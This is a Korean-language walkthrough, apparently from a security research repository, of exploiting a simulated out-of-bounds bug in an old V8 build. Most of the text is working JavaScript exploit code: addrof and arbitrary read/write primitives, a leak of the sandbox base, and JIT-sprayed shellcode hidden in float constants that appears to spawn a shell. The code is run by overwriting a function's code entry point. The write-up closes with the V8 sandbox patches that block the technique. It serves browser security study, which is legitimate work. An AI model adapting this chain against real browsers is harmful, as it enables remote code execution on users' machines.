# V8 OOB Exploitation (Chromium < 103.0.5060.53, V8 < 10.5.23)

## Setup

- Ubuntu 20.04.6 LTS (WSL)
- [7aeb32a3c21bf7b43f394e55c7eb781c0d275c80](https://chromium.googlesource.com/v8/v8/+/7aeb32a3c21bf7b43f394e55c7eb781c0d275c80) (2022.06.17.)

[oob.diff](./oob.diff)는 out of bounds 버그가 발생한 상황을 simulate하기 위해 array의 length를 임의로 더 크게 설정해도 array가 확장되지 않도록 하고, [dcheck.diff](./dcheck.diff)는 debug build에서 exploit을 진행할 때 crash가 발생하지 않도록 debug check를 제거한다.

[setup.sh](./setup.sh)

## Exploitation

### Generate OOB array

```js
// flags: --allow-natives-syntax --shell

let oob_arr = [1.1];

// generate oob array
oob_arr.length = 0x1000;
console.log(`[+] oob_arr.length == ${oob_arr.length}`);

% DebugPrint(oob_arr);
```

![image](https://github.com/user-attachments/assets/03d79c80-8309-44ae-943b-1e056fc4a6be)

![image](https://github.com/user-attachments/assets/62d5ee4d-8b2d-401d-aec1-29f8a8841674)

![image](https://github.com/user-attachments/assets/5e3b1b65-b211-4e01-bcc3-ea0dc0809102)

`oob_arr`은 한 개의 double을 저장할 수 있는 공간만 가지고 있지만, 버그를 발생시켜 length를 증가시켰기 때문에 자유로운 OOB read/write가 가능하다.

![image](https://github.com/user-attachments/assets/64e340e2-ebc8-4d4e-901d-9ba923a6d921)

### Helper functions

```js
let fi_buf = new ArrayBuffer(8); // shared buffer for float and bigint
let f_buf = new Float64Array(fi_buf); // buffer for float
let i_buf = new BigUint64Array(fi_buf); // buffer for bigint

// convert float to bigint
function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

// convert bigint to float
function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}

// convert (big)int to hex string
function hex(i) {
    return `0x${i.toString(16)}`;
}
```

### Get address of arbitrary object

```js
let oob_arr;
let obj_arr;
let tmp_obj = {};

(function layout() {
    oob_arr = [1.1];
    obj_arr = [tmp_obj];
})();

// generate oob array
oob_arr.length = 0x1000;
console.log(`[+] oob_arr.length == ${hex(oob_arr.length)}`);

% DebugPrint(oob_arr);
% DebugPrint(obj_arr);
```

함수 내부에서 `oob_arr`과 `obj_arr`을 연속해서 정의하면 메모리 상에서 인접한 위치에 할당된다. 따라서 `oob_arr`을 통해 `obj_arr`의 메모리에 접근하여 값을 읽고 쓸 수 있다.

![image](https://github.com/user-attachments/assets/68a24430-8826-4833-ae4d-fc18e7baeb69)

![image](https://github.com/user-attachments/assets/be3358d0-df82-4dbd-b304-cf788baa374c)

![image](https://github.com/user-attachments/assets/3e37052b-28b0-431f-9ba5-52a15186ca54)

```js
// get (compressed) address of |obj|
function addrof(obj) {
    obj_arr[0] = obj;
    return ftoi(oob_arr[4]) & 0xffffffffn;
}

// addrof test
let tmp_obj_addr = addrof(tmp_obj);
console.log(`[+] tmp_obj_addr == ${hex(tmp_obj_addr)}`);
```

![image](https://github.com/user-attachments/assets/1f4ed82a-777e-4c87-b9d3-1154d1e1a198)

### Get base address of virtual memory cage

```js
let oob_arr;
let obj_arr;
let tmp_obj = {};
let typed_arr;

(function layout() {
    oob_arr = [1.1];
    obj_arr = [tmp_obj];
    typed_arr = new BigUint64Array(1);
})();

// generate oob array
oob_arr.length = 0x1000;
console.log(`[+] oob_arr.length == ${hex(oob_arr.length)}`);

% DebugPrint(oob_arr);
% DebugPrint(typed_arr);
```

![image](https://github.com/user-attachments/assets/239b9e49-0cc7-4137-aa11-f4f79dbf5b53)

![image](https://github.com/user-attachments/assets/e0c587c6-38d1-445f-bb04-a420edffe7c1)

![image](https://github.com/user-attachments/assets/b716abd8-7fa0-4efb-a7fc-7551b3eb5012)

`TypedArray`의 `external_pointer`를 leak하여 virtual memory cage의 base address를 얻을 수 있다.

```js
// get v8 base
let v8_base = ftoi(oob_arr[22]) & 0xffffffff00000000n;
console.log(`[+] v8_base == ${hex(v8_base)}`);
```

![image](https://github.com/user-attachments/assets/a49b1732-2443-4ce1-b9bb-272cc305c38b)

### Arbitrary address read/write

```js
let oob_arr;
let obj_arr;
let tmp_obj = {};
let typed_arr;

(function layout() {
    oob_arr = [1.1];
    obj_arr = [tmp_obj];
    typed_arr = new BigUint64Array(1);
})();

// generate oob array
oob_arr.length = 0x1000;
console.log(`[+] oob_arr.length == ${hex(oob_arr.length)}`);

% DebugPrint(oob_arr);
% DebugPrint(typed_arr);
```

![image](https://github.com/user-attachments/assets/42ff67f3-d1c1-4764-9631-f96e02edb8d7)

![image](https://github.com/user-attachments/assets/ab2bd67f-45fe-4e1a-984c-4d0caf4de0c9)

![image](https://github.com/user-attachments/assets/4aa61ae5-5dc1-4247-a2a3-2d5653055b12)

OOB를 이용하여 `base_pointer`와 `external_pointer`를 조작하면 임의의 주소에 접근하여 값을 읽거나 쓸 수 있다.

```js
// arbitrary address read/write
function aarw(addr, value = null) {
    oob_arr[22] = itof(addr); // external_pointer of |typed_arr|
    oob_arr[23] = itof(0n); // base_pointer of |typed_arr|
    if (value == null) {
        // if |value| is null, read 8 bytes from |addr|
        return typed_arr[0];
    } else {
        // if |value| isn't null, write |value| to |addr|
        typed_arr[0] = value;
    }
}
```

```js
// aar test
let tmp_obj_addr = v8_base + addrof(tmp_obj);
console.log(`[+] *${hex(tmp_obj_addr - 1n)} == ${hex(aarw(tmp_obj_addr - 1n))}`);
```

![image](https://github.com/user-attachments/assets/662f02ef-372a-4535-8a88-43797bf45e83)

![image](https://github.com/user-attachments/assets/6fed5392-d57e-4322-9fe2-027bca14f0be)

```js
// aaw test
aarw(tmp_obj_addr - 1n, 0x4141414141414141n);
console.log(`[+] *${hex(tmp_obj_addr - 1n)} == ${hex(aarw(tmp_obj_addr - 1n))}`);
```

![image](https://github.com/user-attachments/assets/30a6d0f1-f677-45ed-9ca6-92a6384162ec)

![image](https://github.com/user-attachments/assets/abb24dc2-d465-4713-ab87-1c8db8b5f3e6)

### Execute shellcode - JIT spraying

```js
function jit() {
    return [1.1, 2.2, 3.3, 4.4, 5.5];
}
for (let i = 0; i < 0x10000; i++) { jit(); jit(); } // optimization

% DebugPrint(jit);
```

Double number들로 구성된 array를 반환하는 함수 `jit()`를 Turbofan으로 최적화하면, 상수들이 최적화된 코드에 raw number로 삽입된다.

![image](https://github.com/user-attachments/assets/c77d805b-4790-4221-b703-d995596da150)

![image](https://github.com/user-attachments/assets/c55e3381-13d2-40b2-bd26-14b47a9de336)

![image](https://github.com/user-attachments/assets/d10a89c5-1d79-4c01-ad04-47fce2d96c8c)

![image](https://github.com/user-attachments/assets/a6dea642-bb90-43e3-adc7-643b78392e05)

이를 이용하여 executable memory에 최대 8바이트의 shellcode를 쓸 수 있고, AAW를 이용하여 `code_entry_point`를 shellcode의 주소로 조작하면 optimize된 함수를 호출했을 때 shellcode가 실행된다. 실행하고자 하는 shellcode가 8바이트보다 길 경우, 마지막 2바이트에 `jmp` instruction을 삽입하여 다음 shellcode로 점프하도록 하면 여러 개의 짧은 shellcode들로 chain을 구성할 수 있다.

[shellcode.py](./shellcode.py)

![image](https://github.com/user-attachments/assets/c1a875c5-ff8f-48f5-a0aa-9e473734903a)

```js
function jit() {
    return [
        1.9711828996832522e-246, // itof(0xceb909090c03148n)
        1.971112871410787e-246, // itof(0xceb9050636cb866n)
        1.9711314215434657e-246, // itof(0xceb906163782fb8n)
        1.97118242283721e-246, // itof(0xceb909020e0c148n)
        1.9616425752617766e-246, // itof(0xceb6e69622f0548n)
        1.9711832695973408e-246, // itof(0xceb9090e7894850n)
        1.971182900582351e-246, // itof(0xceb909090f63148n)
        1.9711828996832522e-246, // itof(0xceb909090c03148n)
        1.971112653196158e-246, // itof(0xceb9050303ab866n)
        1.9710920957760286e-246, // itof(0xceb903d59414cb8n)
        1.97118242283721e-246, // itof(0xceb909020e0c148n)
        1.9532382542574046e-246, // itof(0xceb505349440548n)
        1.971183239760578e-246, // itof(0xceb9090e0894850n)
        1.9711128050518315e-246, // itof(0xceb905053db3148n)
        1.971182900255075e-246, // itof(0xceb909090e28948n)
        1.9710902863710406e-246, // itof(0xceb903bb0c03148n)
        -6.828527034370483e-229 // itof(0x909090909090050fn)
    ];
}
console.log("[+] JIT spraying...");
for (let i = 0; i < 0x10000; i++) { jit(); jit(); } // optimization

% DebugPrint(jit);
```

![image](https://github.com/user-attachments/assets/10ac6a84-2129-49e3-9eda-67830e8ac98a)

`jit()`가 반환하는 array에 중복된 값들이 존재할 경우, 위와 같이 레지스터에 저장했다가 재사용하도록 컴파일되어 shellcode가 작동하지 않는다. 따라서 `nop`의 위치를 옮기거나 코드의 순서를 바꿔서 중복된 값들이 없도록 만들어야 한다.

```js
function jit() {
    return [
        1.9711828996832522e-246, // itof(0xceb909090c03148n)
        1.971112871410787e-246, // itof(0xceb9050636cb866n)
        1.9711314215434657e-246, // itof(0xceb906163782fb8n)
        1.97118242283721e-246, // itof(0xceb909020e0c148n)
        1.9616425752617766e-246, // itof(0xceb6e69622f0548n)
        1.9711832695973408e-246, // itof(0xceb9090e7894850n)
        1.971182900582351e-246, // itof(0xceb909090f63148n)
        1.9711831018987653e-246, // itof(0xceb9090c0314890n) (edited)
        1.971112653196158e-246, // itof(0xceb9050303ab866n)
        1.9710920957760286e-246, // itof(0xceb903d59414cb8n)
        1.9710610293119303e-246, // itof(0xceb9020e0c14890n) (edited)
        1.9532382542574046e-246, // itof(0xceb505349440548n)
        1.971183239760578e-246, // itof(0xceb9090e0894850n)
        1.9711128050518315e-246, // itof(0xceb905053db3148n)
        1.971182900255075e-246, // itof(0xceb909090e28948n)
        1.9710902863710406e-246, // itof(0xceb903bb0c03148n)
        -6.828527034370483e-229 // itof(0x909090909090050fn)
    ];
}
console.log("[+] JIT spraying...");
for (let i = 0; i < 0x10000; i++) { jit(); jit(); } // optimization
```

이후 `jit()`의 `code_entry_point`를 shellcode의 주소로 덮어쓰고 `jit()`를 호출하면 shellcode가 실행된다.

```js
let jit_addr = v8_base + addrof(jit); // address of |jit()|
console.log(`[+] jit_addr == ${hex(jit_addr)}`);
let code_addr = v8_base + (aarw(jit_addr - 1n + 0x18n) & 0xffffffffn); // address of CodeDataContainer of |jit()|
console.log(`[+] code_addr == ${hex(code_addr)}`)
let entrypoint_addr = aarw(code_addr - 1n + 0x10n); // address of code_entry_point of |jit()|
console.log(`[+] entrypoint_addr == ${hex(entrypoint_addr)}`);

// overwrite code_entry_point of |jit()| with address of shellcode
// aarw(code_addr - 1n + 0x10n, entrypoint_addr + 0x7en); // debug
aarw(code_addr - 1n + 0x10n, entrypoint_addr + 0x67n); // release

// execute shellcode
console.log("[+] Executing shellcode...");
jit();
```

[pwn.js](./pwn.js)

![image](https://github.com/user-attachments/assets/2fc52d74-bc51-4130-a67b-ee42e7db2b22)

## Patch

> [[sandbox] Enable sandboxed pointers on Desktop](https://chromium.googlesource.com/v8/v8/+/48481a671ac7fed873f8a7e7203862beb6d89abd) (2022.05.05.)

```diff
diff --git a/BUILD.gn b/BUILD.gn
index 4cec248..15a69cb 100644
--- a/BUILD.gn
+++ b/BUILD.gn
@@ -501,6 +501,11 @@
       v8_enable_external_code_space
 }
 
+# Enable sandboxed pointers on desktop when the sandbox is enabled.
+if (v8_enable_sandbox && !is_android && !is_fuchsia) {
+  v8_enable_sandboxed_pointers = true
+}
+
 # Enable all available sandbox features if sandbox future is enabled.
 if (v8_enable_sandbox_future) {
   v8_enable_sandboxed_pointers = true
```

> [[sandbox] Also enable the sandbox outside of Chromium builds](https://chromium.googlesource.com/v8/v8/+/5b9401dde4532719220ac698eef7012cdd371903) (2022.06.17.)

```diff
diff --git a/BUILD.gn b/BUILD.gn
index 9ad799ec..41dab6b 100644
--- a/BUILD.gn
+++ b/BUILD.gn
@@ -501,9 +501,8 @@
   # once that is enabled everywhere by default.
   # TODO(chromium:1325784) the sandbox is not currently supported in Chromium
   # on Fuchsia.
-  v8_enable_sandbox =
-      build_with_chromium && v8_enable_pointer_compression_shared_cage &&
-      v8_enable_external_code_space && target_os != "fuchsia"
+  v8_enable_sandbox = v8_enable_pointer_compression_shared_cage &&
+                      v8_enable_external_code_space && target_os != "fuchsia"
 }
 
 # Enable sandboxed pointers when the sandbox is enabled.
```

V8 sandbox가 활성화되어 TypedArray의 external pointer의 크기가 4바이트로 줄어들었기 때문에, 이제 external pointer를 통해 virtual memory cage를 escape할 수 없다.
